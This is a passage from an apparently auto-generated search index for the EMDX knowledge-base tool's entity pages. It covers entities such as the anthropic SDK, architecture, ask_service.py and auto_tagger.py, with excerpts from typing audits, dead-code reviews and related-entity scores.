\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>console = console()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>ask.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.1)</li> <li><code>review.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>gist.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.9)</li> <li><code>status.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.8)</li> <li><code>_process_stage</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.8)</li> <li><code>maintain.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.7)</li> </ul>"},{"location":"entities/anthropic/","title":"anthropic","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-15</p>"},{"location":"entities/anthropic/#documents-9","title":"Documents (9)","text":"<ul> <li>#6490 Any Type Removal Analysis [4/5]   Section: 1. <code>_client</code> instance variable (Line 44) <p>Recommended:</p> </li> </ul> <pre><code>self._client: anthropic.Anthropic | None = None\n</code></pre> <ul> <li>#6476 EMDX Knowledge Base Enhancement: Complete Implementation Guide   Section: Implementation Components <p>...ocuments()<code>,</code>estimate_cost()<code>,</code>_fetch_documents()`</p> </li> <li>Import guards for optional <code>anthropic</code> dependency</li> <li> <p>Returns <code>SynthesisResult</code> with content, title, token usage</p> </li> <li> <p>#6467 emdx distill Command Implementation   Section: Core Components</p> <p>...- Audience-specific system prompts tailor output style and tone</p> </li> <li>Uses lazy-loaded Anthropic client with import guards for optional dependency</li> <li> <p>Truncates documents to 6000 characters to manage context window</p> </li> <li> <p>#6451 Implement emdx distill command   Section: Summary</p> <p>...s</p> </li> <li>Audience-aware prompts (me/docs/coworkers)</li> <li> <p>Import guards for optional <code>anthropic</code> dependency</p> </li> <li> <p>#6450 Implement emdx distill command   Section: 1. emdx/services/synthesis_service.py</p> <p>...rs)</p> </li> <li><code>_build_user_prompt()</code> - Context and topic-focused prompts</li> <li> <p>Lazy-loaded Anthropic client with import guard</p> </li> <li> <p>#6446 Implement emdx distill command   Section: Files Created/Modified</p> <p>...lass for tracking synthesis output and token usage</p> </li> <li>Uses Claude Sonnet API via anthropic SDK (optional dependency)</li> <li> <p>Audience-specific prompts for different output styles</p> </li> <li> <p>#6421 Delegate: Research upgrading the anthropic Python SDK from 0.40.0 to 0 [2/5]   Section: Current Usage in EMDX</p> <p>The project uses <code>anthropic</code> as an optional dependency for AI features (<code>emdx[ai]</code>).</p> </li> <li> <p>#6367 Gameplan: emdx compact \u2014 AI-Powered KB Synthesis   Section: Task 2.1: Create <code>SynthesisService</code></p> </li> <li> <p>#6426 Delegate synthesis [synthesis]   Section: Upgrade Overview</p> <p>...loop scope | | pytest-cov | ^4.0.0 | ^7.0.0 | Low | Requires coverage ^7.10.6 | | anthropic | ^0.40.0 | ^0.79.0 | Low | No breaking changes for our usage | | textual | ^6.2.1 | ^7.5.0 | Low-Med | Requires Rich 14.x | | rich | ^13.0.0 | ^14.3.0 | Low | Requi...</p> </li> </ul>"},{"location":"entities/anthropic/#optional-anthropic-import","title":"Optional anthropic import","text":"<p>try:     import anthropic     HAS_ANTHROPIC = True except ImportError:     HAS_ANTHROPIC = False</p>"},{"location":"entities/anthropic/#related-entities","title":"Related Entities","text":"<ul> <li><code>mocked anthropic</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>implementation: emdx distill command</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>coworkers</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>auth summary</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>@app.callback(invoke_without_command=true)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>uses claude opus</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>synthesis layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>overview implemented</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>future extensions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>emdx compact --schedule weekly</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> </ul>"},{"location":"entities/architecture/","title":"architecture","text":"<p>Type: heading | Mentioned in: 12 documents | First seen: 2025-07-07</p>"},{"location":"entities/architecture/#documents-12","title":"Documents (12)","text":"<ul> <li>#6476 EMDX Knowledge Base Enhancement: Complete Implementation Guide <p>Uses Claude Opus to merge related documents while preserving insights and eliminating duplication. ### Architecture</p> </li> </ul> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                        emdx compact                        ...\n\n- **#6474** EMDX Feature Implementation Synthesis\n  *Section: Two Implementation Modes*\n  &gt; ...% similar)\n#   #6085 \"Research Findings\" (61% similar)\n# Suggested tags: gameplan, architecture\n# Suggested project: proze\n# Recommendation: Overlaps with #6086. Consider updating instead.\n</code></pre> <ul> <li>#6467 emdx distill Command Implementation <p>This feature addresses the need from gameplan #6368 to transform KB content into formats suitable for different audiences. ## Architecture</p> </li> </ul>"},{"location":"entities/architecture/#core-components","title":"Core Components","text":"<p>1. SynthesisService (<code>emdx/services/synthesis_service.py</code>) - Main service class for A...</p> <ul> <li>#6367 Gameplan: emdx compact \u2014 AI-Powered KB Synthesis </li> </ul> <p>Users accumulate redundant documents from: - Repeated delegate runs on similar topics - Incremental notes that overlap - Multiple analysis passes that partially duplicate findings</p> <p>Current <code>maintain --merge</code> just concatenates co...</p> <ul> <li>#6366 Gameplan: emdx distill \u2014 Synthesize KB Content for Sharing <p>Fills the gap between <code>find</code> (discovery) and <code>ai ask</code> (Q&amp;A) by producing shareable output optimized for different audiences. ## Motivation</p> </li> </ul> <p>Users want to share curated findings with coworkers but currently lack a way to: - Filter docs by quality (not...</p> <ul> <li> <p>#6191 Delegate: analysis [3/3]   Section: Design Patterns</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]</p> <p>It provides hierarchical task management, dependency tracking, execution history, and status monitoring. ## Architecture</p> </li> </ul>"},{"location":"entities/architecture/#problem-statement","title":"Problem Statement","text":""},{"location":"entities/architecture/#event-driven-architecture","title":"Event-Driven Architecture","text":"<p>Log streaming uses OS-level file watching rather than polling for efficient real-time updates.</p>"},{"location":"entities/architecture/#core-components_1","title":"Core Components","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                        Task Syste...\n\n- **#6158** Delegate: analysis [5/5]\n  &gt; Version **0.14.0**. ### Core Purpose\n- Full-text searchable personal knowledge base\n- AI-powered task delegation and autonomous execution\n- TUI (Terminal User Interface) browser for navigation\n- Git integration for project-aware document management\n\n...\n\n- **#6094** EMDX Feature Deep Dive - Claude-First Design\n  *Section: FEATURE 1: Smart Priming (`emdx prime --smart`)*\n  &gt; ...aster Gameplan\" (most referenced), #6088 \"AI Thesis\"\nOpen tasks: none\nKB coverage: architecture \u2713, algorithms \u2713, risk analysis \u2713, testing \u2717, packaging \u2717\n</code></pre> <ul> <li>#4 CLA Textual Migration Plan <p>Leverage Python's rich ecosystem for future enhancements</p> </li> <li>Better handling of markdown rendering and preview</li> </ul>"},{"location":"entities/architecture/#architecture_1","title":"Architecture","text":""},{"location":"entities/architecture/#technology-stack","title":"Technology Stack","text":"<ul> <li>Python 3.10+: Core language</li> <li>Textual: TUI framework for rich interfaces</li> <li> <p>SQLModel: Da...</p> </li> <li> <p>#6331 Delegate: Architecture Analysis Tags [7/12]   Section: Tag Recommendations for Document #6330</p> </li> <li> <p>#6739 Academic Tool Research: Semantic Scholar TLDR &amp; Recommendation Graph   Section: How \"Related Papers\" Are Surfaced</p> </li> <li>Architecture: SciBERT-initialized transformer trained with citation-informed contrastive learning</li> <li>Training: Triplet loss on (query paper, positive paper, negative paper)...</li> </ul>"},{"location":"entities/architecture/#document-summary","title":"Document Summary","text":"<p>Document #6330 is the EMDX Architecture Analysis Synthesis - a comprehensive consolidation of findings from 6 detailed architecture analyses covering ~37K lines across 132 files.</p>"},{"location":"entities/architecture/#a-specterspecter2-embeddings-primary-signal","title":"a) SPECTER/SPECTER2 Embeddings (Primary Signal)","text":""},{"location":"entities/architecture/#related-entities","title":"Related Entities","text":"<ul> <li><code>quality assurance</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>motivation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>mocked anthropic</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>synthesis layer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>suggested project: proze</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>similar existing docs:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>register command</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>project overview</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>pr creation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> <li><code>implementation tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/args-any-kwargs-any/","title":"args: any, *kwargs: any","text":"<p>Type: tech_term | Mentioned in: 9 documents | First seen: 2026-02-15</p>"},{"location":"entities/args-any-kwargs-any/#documents-9","title":"Documents (9)","text":"<ul> <li>#6583 Delegate synthesis [synthesis]   Section: Production Code (<code>services/</code> + <code>ui/</code>) <p>...echanical: add <code>TypedDict</code> definitions or <code>TYPE_CHECKING</code> guards</p> </li> <li> <p>Textual widget <code>*args: Any, **kwargs: Any</code> and <code>cli_executor/</code> polymorphic JSON are correctly exempt per CLAUDE.md</p> </li> <li> <p>#6581 Delegate: Audit emdx/ui/ for methods with Any-typed parameters that co [2/3]   Section: Summary</p> <p>Audited all 40+ Python files in <code>emdx/ui/</code>. Found 21 distinct fixable <code>Any</code> usages across 14 files. Several are already correctly typed (Textual <code>*args: Any, **kwargs: Any</code> convention) and should be left alone per CLAUDE.md exceptions.</p> </li> <li> <p>#6578 Delegate: List all TypedDicts defined in emdx/ and count how many file   Section: Remaining <code>Any</code> Hotspots to Address</p> <p>...ified_executor.py<code></code>to_dict()` \u2014 serialization (documented exception)</p> </li> <li> <p>UI widget <code>*args: Any, **kwargs: Any</code> \u2014 Textual framework convention (documented exception)</p> </li> <li> <p>#6514 Any removal Phase 3: Protocols   Section: 5. Files NOT changed (analysis)</p> <ul> <li><code>vim_line_numbers.py</code>: Only uses <code>*args: Any, **kwargs: Any</code> for standard widget initialization - these are fine as <code>Any</code> since they're passed through to <code>Static.__init__</code></li> </ul> </li> <li> <p><code>palette_screen.py</code>: <code>kwargs: Any</code> patterns are...</p> </li> <li> <p>#6493 Any Type Removal Analysis [2/5]   Section: 1. <code>emdx/ui/browser_container.py</code></p> <p>...eturns the <code>KeybindingRegistry</code> instance or None | | 82 | <code>def __init__(self, ..., *args: Any, **kwargs: Any)</code> | <code>*args: object, **kwargs: object</code> | Standard pattern for passing through to parent <code>App.__init__</code> | | 85 | <code>self.browser_states: dict[str, Any]</code> | `dict[str, dic...</p> </li> <li> <p>#6486 Any Type Removal Analysis [2/5]   Section: 1. <code>emdx/ui/browser_container.py</code></p> <p>...instance or <code>None</code> | | 82 | <code>def __init__(self, initial_theme: str \\| None = None, *args: Any, **kwargs: Any)</code> | <code>*args: object, **kwargs: object</code> | Generic App init args - <code>object</code> is safer than <code>Any</code> | | 85 | <code>self.browser_states: dict[str, Any] = {}</code> | `dict[str, dict[st...</p> </li> <li> <p>#6436 Any/None typing audit [5/5]   Section: activity/group_picker.py</p> <p>...--------|-----------|--------------|----------------------| | <code>__init__</code> | L114 | <code>*args: Any, **kwargs: Any</code> | \u274c No | Widget passthrough | | <code>self.groups</code> | L116 | <code>list[dict[str, Any]]</code> | \u2705 Yes | <code>list[GroupRow]</code> (TypedDict) | | <code>self.filtered_groups</code> | L117 | `list[dict[...</p> </li> </ul>"},{"location":"entities/args-any-kwargs-any/#related-entities","title":"Related Entities","text":"<ul> <li><code>services/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.6)</li> <li><code>widget: widget</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>ui/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>title_input: input</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>qa_presenter.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>popular_tags: list[dict[str, any]]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>lower impact</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>log_browser*.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>event: activityview.viewdocument</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> <li><code>callable[[], none]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.6)</li> </ul>"},{"location":"entities/askservicepy/","title":"ask_service.py","text":"<p>Type: heading | Mentioned in: 13 documents | First seen: 2026-02-14</p>"},{"location":"entities/askservicepy/#documents-13","title":"Documents (13)","text":"<ul> <li> <p>#6434 Any/None typing audit [4/5]</p> <p>| Suggested Replacement | |----------|--------------|--------------|----------------------| | <code>parse_stream_line()</code> | Return <code>dict[str, Any] \\| None</code> | \u26a0\ufe0f Partial | Same as cursor.py | | <code>validate_environment()</code> | Return <code>tuple[bool, dict[str, Any]]</code>...</p> </li> <li> <p>#6873 Delegate: Document #6864 (Delegate synthesis [synthesis]):</p> </li> </ul>"},{"location":"entities/askservicepy/#synthes-14","title":"Synthes [1/4]","text":"<p>Section: Functions with ZERO Callers Outside Their Own File</p> <p>...s/synthesis_service.py<code>|</code>distill_single<code>| **NO** | no | *nowhere* | |</code>services/ask_service.py<code>|</code>ask_with_context<code>| **NO** | no | *nowhere* | |</code>services/cli_executor/factory.py<code>|</code>get_available_cli_tools<code>| **NO** | no | *nowhere* | |</code>services/cli_execut...</p> <ul> <li>#6611 Emoji alias removal: synthesis   Section: Actionable Items <p>...s/core.py<code>\u2014 remove all 5</code>expand_alias_string` calls</p> </li> <li>Update <code>auto_tagger.py</code>, <code>ask_service.py</code>, <code>unified_search.py</code> (1 change each)</li> <li>Rewrite <code>formatting.py:order_tags()</code> with text-based category sets</li> <li> <p>Update <code>stale.py</code> TAG_WEIGHTS and <code>recipe.py</code> tag lite...</p> </li> <li> <p>#6519 Delegate: Analyze FEAT-7: Re-implement ask-kb improvements (PR #453).  [2/2]   Section: 1. <code>--tags</code> Filter \u274c MISSING**</p> <p>...<code>ask_question()</code> and <code>get_context()</code> commands</p> </li> <li>Create <code>_add_filters()</code> helper in <code>ask_service.py</code></li> <li>Integrate with <code>document_tags</code> and <code>tags</code> tables</li> <li> <p>Use <code>normalize_tag_to_emoji()</code> for alias resolution</p> </li> <li> <p>#6518 Any removal Phase 1: Quick wins   Section: 4. Removed unused <code>Any</code> imports</p> <p>...doc data dict</p> </li> <li><code>emdx/ui/log_browser.py</code> - log browser subscriber</li> <li> <p><code>emdx/services/ask_service.py</code> - Anthropic client, embedding service</p> </li> <li> <p>#6508 Any Type Removal Analysis [synthesis]   Section: Priority Implementation Order</p> </li> <li>Replace all <code>**kwargs: Any</code> with <code>**kwargs: object</code> in <code>__init__</code> methods</li> <li>Replace SQL param <code>list[Any]</code> with <code>list[str | int]</code> in ask_service.py</li> <li> <p>Type lazy-loaded services with <code>TYPE_CHECKING</code> guards</p> </li> <li> <p>#6490 Any Type Removal Analysis [4/5]   Section: Summary</p> <p>Analysis of <code>Any</code> type annotations in four services files:</p> </li> <li><code>emdx/services/ask_service.py</code> - 6 occurrences</li> <li><code>emdx/services/unified_search.py</code> - 4 occurrences</li> <li><code>emdx/services/file_watcher.py</code> - 2 occurrences</li> <li> <p><code>emdx/services/embedding_service.py</code> - 2 occ...</p> </li> <li> <p>#6326 Delegate: Analyze emdx/services/ for architecture improvements. Focus  [2/10]   Section: B. Services That Could Merge</p> </li> <li><code>auto_tagger.py</code> - distinct business logic (pattern matching)</li> <li><code>ask_service.py</code> - distinct feature (RAG Q&amp;A)</li> <li><code>cascade_service.py</code> - pipeline orchestration</li> <li> <p><code>health_monitor.py</code> - knowledge base analytics</p> </li> <li> <p>#6269 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [25/37]   Section: 2. Centralized Model Name Strings</p> <p>Previously duplicated in 5 files:</p> </li> <li><code>cli_config.py</code> (multiple locations)</li> <li><code>ask_service.py</code></li> <li> <p><code>constants.py</code></p> </li> <li> <p>#6234 Delegate: Tech Debt Category Audit 2026-02-14 [14/14]   Section: CATEGORY 4: Import &amp; Dependency Patterns</p> </li> <li>18 files with ImportError fallbacks - creates runtime None-checks</li> <li>Affects: <code>similarity.py</code>, <code>embedding_service.py</code>, <code>ask_service.py</code>, various UI files</li> <li> <p>Pattern: <code>try: import X except ImportError: X = None</code></p> </li> <li> <p>#6511 None Type Analysis [synthesis]   Section: File-by-File Summary</p> <p>...ary</p> </li> <li>auto_tagger.py: All 8 necessary</li> <li>similarity.py: All 2 necessary</li> <li>ask_service.py: All 2 necessary</li> <li>synthesis_service.py: All 2 necessary</li> <li>document_merger.py: All 5 necessary</li> <li>embedding_service.py: All 1 necessary</li> <li> <p>**log_stream.p...</p> </li> <li> <p>#6497 None Type Analysis [6/7]   Section: ACTUALLY UNNECESSARY <code>| None</code> Annotations</p> </li> </ul> <pre><code>self._client: Any = None\nself._embedding_service: Any = None\n</code></pre> <p>Verdict: NECESSARY \u2014 These are lazy-loaded and start as <code>None</code>.</p>"},{"location":"entities/askservicepy/#phase-1-quick-wins-1-2-hours","title":"Phase 1: Quick Wins (1-2 hours)","text":""},{"location":"entities/askservicepy/#keep-separate","title":"Keep Separate","text":""},{"location":"entities/askservicepy/#import-complexity","title":"Import Complexity","text":""},{"location":"entities/askservicepy/#2-ask_servicepy42-45-internal-state","title":"2. <code>ask_service.py:42-45</code> \u2014 Internal state","text":""},{"location":"entities/askservicepy/#related-entities","title":"Related Entities","text":"<ul> <li><code>observer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.0)</li> <li><code>execution_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.0)</li> <li><code>on_modified</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>simplevimlinenumbers.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>self.observer</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>searchscreen.__init__</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>cli_executor/factory.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>cli_executor/claude.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>_get_model()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>embedding_service.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/autotaggerpy/","title":"auto_tagger.py","text":"<p>Type: heading | Mentioned in: 13 documents | First seen: 2026-01-05</p>"},{"location":"entities/autotaggerpy/#documents-13","title":"Documents (13)","text":"<ul> <li>#6434 Any/None typing audit [4/5]   Section: Priority Recommendations <p>...ecutor/base.py<code>-</code>validate_environment()` return type (affects all executors)</p> </li> <li> <p><code>auto_tagger.py</code> - <code>batch_auto_tag()</code> return</p> </li> <li> <p>#6874 Delegate synthesis [synthesis]   Section: Common Themes</p> <p>...s: <code>document_merger.py</code> (merge strategies), <code>health_monitor.py</code> (health reports), <code>auto_tagger.py</code> (batch tagging, custom patterns), <code>execution_monitor.py</code> (zombie cleanup). These were likely written speculatively or for planned features that didn't materialize.</p> </li> <li> <p>#6873 Delegate: Document #6864 (Delegate synthesis [synthesis]):</p> </li> </ul>"},{"location":"entities/autotaggerpy/#synthes-14","title":"Synthes [1/4]","text":"<p>Section: Functions with ZERO Callers Outside Their Own File</p> <p>...ervices/similarity.py<code>|</code>get_index_stats<code>| **NO** | no | *nowhere* | |</code>services/auto_tagger.py<code>|</code>batch_auto_tag<code>| **NO** | no | *nowhere* | |</code>services/auto_tagger.py<code>|</code>add_custom_pattern<code>| **NO** | no | *nowhere* | |</code>services/auto_tagger.py<code>|</code>remove_...</p> <ul> <li>#6872 Delegate: Document #6864 (Delegate synthesis [synthesis]):</li> </ul>"},{"location":"entities/autotaggerpy/#synthes-34","title":"Synthes [3/4]","text":"<p>Section: 1. <code>emdx/config/constants.py</code> \u2014 38 dead constants</p> <p>...LT_TASK_PRIORITY<code>|</code>models/tasks.py<code>| |</code>DEFAULT_TAGGING_CONFIDENCE<code>|</code>services/auto_tagger.py<code>,</code>tagging_rules.py<code>| |</code>DEFAULT_MAX_TAGS_PER_DOC<code>|</code>services/auto_tagger.py<code>| |</code>DEFAULT_MAX_SUGGESTIONS<code>|</code>services/auto_tagger.py<code>| |</code>DELEGATE_EXECUTION_TIM...</p> <ul> <li>#6611 Emoji alias removal: synthesis   Section: Actionable Items <p>...Simplify <code>commands/core.py</code> \u2014 remove all 5 <code>expand_alias_string</code> calls</p> </li> <li>Update <code>auto_tagger.py</code>, <code>ask_service.py</code>, <code>unified_search.py</code> (1 change each)</li> <li>Rewrite <code>formatting.py:order_tags()</code> with text-based category sets</li> <li> <p>Update <code>stale.py</code> TAG_WEIGHTS and `r...</p> </li> <li> <p>#6610 Delegate: Search the entire emdx codebase for every import or referenc [2/2]   Section: 1. <code>EMOJI_ALIASES</code> (dict constant)</p> <p>...es.py<code>| 278 | Used in</code>suggest_aliases()<code>\u2014 iterates</code>.keys()<code>| |</code>emdx/services/auto_tagger.py<code>| 19 | **Import**:</code>from ..utils.emoji_aliases import EMOJI_ALIASES<code>| |</code>emdx/services/auto_tagger.py<code>| 177 | **Usage**:</code>emoji_tag = EMOJI_ALIASES.get(tag, tag)`...</p> </li> <li> <p>#6377 Codebase Bug Audit 2026-02-15 [5/10]   Section: Issues Found</p> <p><code>tagging_rules.py</code> imports from <code>auto_tagger.py</code> at line 220, while <code>auto_tagger.py</code> imports from <code>tagging_rules.py</code> at line 120. This is a circular dependency:</p> </li> <li> <p><code>auto_tagger.py:120</code> \u2192 `from ..config.tagging_...</p> </li> <li> <p>#6327 Delegate: analysis,architecture [7/10]   Section: Areas for Improvement</p> <p>Other services use function-based modules:</p> </li> <li> <p><code>auto_tagger.py</code>, <code>file_watcher.py</code>, <code>log_stream.py</code></p> </li> <li> <p>#6326 Delegate: Analyze emdx/services/ for architecture improvements. Focus  [2/10]   Section: 3. Functions That Are Too Long</p> </li> <li> <p>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers</p> <p>...completion</p> </li> <li><code>log_stream.py</code>: event-driven log streaming via file watcher</li> <li><code>auto_tagger.py</code>: automatic tag assignment</li> <li><code>health_monitor.py</code>: system health checks</li> <li> <p><code>cli_executor/</code>: pluggable CLI executor factory (Claude, Cursor)</p> </li> <li> <p>#1835 Architecture Analysis: 